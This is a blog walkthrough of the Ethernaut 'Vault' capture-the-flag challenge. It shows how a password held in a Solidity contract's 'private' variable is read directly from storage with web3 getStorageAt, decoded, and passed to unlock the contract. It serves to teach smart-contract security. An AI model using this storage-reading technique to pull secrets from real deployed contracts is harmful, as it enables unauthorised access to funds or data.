+++
title = "Vault - Ethernaut"
date = "2022-01-08"
author = "Dimitris Vagiakakos"
+++
On this challenge, we have to unlock the vault to win the challenge.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

First of all, we can see that we have 2 state variables. One of them is the locked variable which is public. That means that we can very easily see what it is inside the variable by typing:
```
await contract.locked()
```

Also, we have the private variable password. Using the console, we cannot just see what it is inside just easily. Therefore, we have 2 options to try in order to solve the problem.


* By brute forcing the password, until we find the right one and then unlock the vault. It's possible to happen, but there is a much easier way to achieve this.
* Somehow, to dump the password from the storage of the contract.

As we have already mentioned earlier, Ethereum is a public Blockchain. That means that everyone can see what exists inside of it. We know that password variable is uint private. In Ethereum from the Solidity Docs, we know that a private type access mean that a variable can be called only from the same smart-contract, not externally by using an another smart-contract or by calling contract.password() from console. As Ethereum is a public ledger, we can just query the smart-contract from it's storage.
Web3.js can help us achieving this, by typing in console:


```
var pwd // to create a variable 
web3.eth.getStorageAt(contract.address, 1,  function(err, result){pwd = result})
```

This command will return :
```
0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```
That is the password in hexadecimal mode. We can very easily convert this hexadecimal in Ascii from our console by typing:

```
web3.utils.toAscii(pwd)
```
And this will return us:
```
A very strong secret password :)
```

As we have the hexadecimal version of the password, we can simply create a transaction in the function  unlock and the hexadecimal value as an input by typing:
```
contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```
Now if we check the Boolean variable locked by typing "contract.locked()" we can see that it is unlocked. We pwned it.
To sum up, we should never insert data unencrypted in Blockchain networks, especially in public Blockchains, as everyone can see what it is inside.

---
If you want to learn more about Smart Contract Security, please check our paper and eCourses:
## Smart-Contract Security:


* [Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here](https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7)
* 
* [Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here](https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&lid=b0b540e62d96ed2811b776519fc460617e4c40747)

